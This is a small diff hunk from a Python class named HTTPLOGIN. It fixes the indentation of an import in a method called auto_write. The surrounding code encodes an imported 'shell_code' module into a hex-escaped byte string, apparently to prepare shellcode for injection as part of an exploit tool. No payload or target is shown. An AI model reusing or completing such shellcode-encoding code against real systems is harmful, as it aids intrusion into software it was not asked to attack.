@@ -400,7 +400,7 @@ class HTTPLOGIN():
                    exit()  
                    
      def auto_write(self): 
-                 from shell_code import shell_code      	     
+                from shell_code import shell_code      	     
                 try:                
                   shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
